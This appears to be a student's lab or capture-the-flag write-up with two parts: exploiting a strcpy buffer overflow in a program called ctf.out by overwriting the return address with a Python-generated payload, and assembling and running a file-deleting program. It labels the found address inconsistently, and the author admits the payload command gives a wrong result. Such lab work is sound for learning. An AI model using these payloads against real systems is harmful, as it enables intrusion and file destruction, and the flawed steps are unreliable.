# 2.1 Conduct attack on  CTF.c 

![image](https://github.com/user-attachments/assets/870fbe06-03b0-4bdf-bf77-cc86cd3051d6)

> There is a buffer overflow vulnerability in the vuln function:
> strcpy(buf, s) can copy more than 100 characters into the buf array, causing memory overflow and overwriting the next memory regions on the stack (including the return address of the function).
>  If I inputs a long enough string and knows `the address of the myfunc function`, I can overwrite the return address on the stack, forcing the program to jump to the `myfunc function` after the `vuln function` finishes.


First of all run :
```bash
objdump -d ctf.out | grep myfunc
```


![image](https://github.com/user-attachments/assets/13b9d00b-60f6-4c91-8587-03319bc9bfa1)


You will know the address of function vuln() is `0804851b`


![image](https://github.com/user-attachments/assets/3fa4af65-8aa4-4475-82fd-8af37de72d4d)

```bash
./ctf.out $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
```

> Sorry i don't why my cmd return a wrong answer :(
 


# 2.2 Inject code to delete file: file_del.asm is given on github

run `file_del.asm` with nasm
```bash
nasm -f elf32 file_del.asm -o file_del.o
```

```bash
ld -m elf_i386 file_del.o file_del
```

create a new file named `dummyfile` use `nano`

```bash
nano dummyfile 
```


![image](https://github.com/user-attachments/assets/6c7bafc2-631e-4d57-8dd9-00d27c57d74c)


and after that 

```bash
./file_del
```

and file named  `dummyfile` will be deleted

![image](https://github.com/user-attachments/assets/edfb7ba3-df75-4c8d-84fd-2125f357f8d0)


